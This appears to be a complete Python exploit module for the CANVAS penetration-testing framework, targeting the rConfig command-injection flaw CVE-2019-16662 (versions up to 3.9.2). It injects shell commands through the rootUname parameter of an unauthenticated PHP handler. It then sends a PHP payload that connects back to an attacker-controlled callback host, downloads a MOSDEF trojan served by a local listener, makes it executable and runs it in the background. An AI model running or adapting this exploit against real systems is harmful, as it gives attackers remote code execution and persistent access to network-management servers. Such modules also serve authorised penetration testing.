#!/usr/bin/env python2
import os
import re
import sys
import hmac
import time
import urllib
import hashlib
import threading
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager

from libs.spkproxy import urlopen
from libs.canvasos import canvasos


NAME                            = 'rconfig_ajaxserver_rce'
DESCRIPTION                     = 'rConfig uses the GET parameter rootUname without validation in an exec function, allowing us to execute arbitrary commands'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "rConfig"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-16662'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-16662"
DOCUMENTATION["References"]     = "https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/unpatched-remote-code-execution-rconfig-flaws-could-affect-millions-of-servers-and-network-devices"
DOCUMENTATION["Date public"]    = "21/09/2019"
DOCUMENTATION["NOTES"]          = """

The current exploit initializes a tcp server to serve the mosdef callback (port 8080)

IMPORTANT: In the path textfield you need the path to the rConfig webapp.


Tested on:
 * CentOS7, rConfig v3.9.2
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["UNIX"] ]
PROPERTY['VERSION']             = [ "<=3.9.2" ]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.payloadType = 0

        self.host = ""
        self.hostname = ''
        self.port = 443
        self.https = True
        self.hostname = None
        self.arch = None
        self.tcp_server_port = 8080
        self.ua = None

        self.basicauth_user = ""
        self.basicauth_password = ""

        self.vulnerable_path = '/install/lib/ajaxHandlers/ajaxServerSettingsChk.php'

    def neededListenerTypes(self):
       return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.tcp_server_port = int(self.argsDict.get("tcp_server_port", self.tcp_server_port))
        self.basicauth = self.basicauth_user != ''

        if self.hostname == '' or self.hostname is None:
            self.hostname = self.host

    def send_request(self, url, auth, noresponse):
        logging.debug('URL: ' + url)
        (fd, code) = urlopen(url,
                         verb='GET',
                         exploit=self,
                         hostname=self.hostname,
                         auth=auth,
                         noresponse=noresponse,
                         entireresponse=False,
                         return_response_code=True
                    )

        if noresponse:
            return (None, None)

        return (fd.read(), code)

    def build_url(self,  path=''):
        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += path if path else '/'
        return target

    def send_payload(self, path, noresponse):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = self.build_url(path=path)
        response, code = self.send_request(url, auth, noresponse)
        return response, code

    def run_command(self, cmd, noresponse=False):
        query = { 'rootUname' : 'imm;%s;#' % cmd }
        path = self.vulnerable_path + '?%s' % urllib.urlencode(query)
        logging.info("Executing: %s" % cmd)
        response, code = self.send_payload(path=path, noresponse=noresponse)

        if not noresponse:
            match = re.search('passed: (.*)\<\\\\/strong', response)

            if match:
                return match.group(1)

        return None

    def search_dir_writable_and_executable(self):
        return './'

    def build_mosdef_trojan(self):
        ret = None
        t_os = canvasos("Linux")
        t_os.arch = 'X64' if self.arch == 'x86_64' else 'X86'
        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
        except Exception, err:
            logging.info("Error while building MOSDEF callback: %s" % str(err))

        return ret

    def start_tcp_server(self):
        logging.info('Starting TCP server (port %d)' % self.tcp_server_port)
        try:
            s = gettcplistener(self.tcp_server_port)
            client, _ = s.accept()
            logging.info('Sending MOSDEF callback')
            client.sendall(self.mosdeftrojan)
            s.close()
        except:
            logging.error('Error while handling TCP connection')

    def build_php_payload(self, callback_ip, callback_port, fname):
        php_payload = '''
$s=fsockopen("CALLBACK_IP",CALLBACK_PORT);
$d="";
$f="TMP_FILENAME";
while(!feof($s))$d.=fread($s, 8192);
fclose($s);
file_put_contents($f,$d);
exec("chmod +x ".$f);
exec($f." >/dev/null &");
'''
        php_payload = php_payload.replace('CALLBACK_IP', callback_ip)
        php_payload = php_payload.replace('CALLBACK_PORT', str(callback_port))
        php_payload = php_payload.replace('TMP_FILENAME', fname)

        return php_payload.replace('\n', '')

    def run(self):
        result = False
        self.setProgress(0)
        self.getargs()
        self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))
        self.setProgress(33)

        self.arch = self.run_command('uname -m')

        # check if it's vulnerable
        if self.arch:
            logging.info("Target appears to be vulnerable")
            if self.build_mosdef_trojan():
                self.setProgress(66)

                t = threading.Thread(target=self.start_tcp_server)
                t.setDaemon(True)
                t.start()
                time.sleep(1.0)

                fname = self.search_dir_writable_and_executable() + randomstring(8)
                php_payload = self.build_php_payload(self.callback.ip, self.tcp_server_port, fname)
                self.run_command("php -r '%s'" % php_payload, noresponse=True)
                for i in range(30):
                    time.sleep(0.5)
                    logging.info('Waiting for callback...')
                    if self.ISucceeded():
                        result = True
                        break
            else:
                logging.error("Error while building MOSDEF callback")

        else:
            logging.error("Target %s is not vulnerable" % self.hostname)

        if result:
            self.setProgress(100)
            self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
            return True
        else:
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

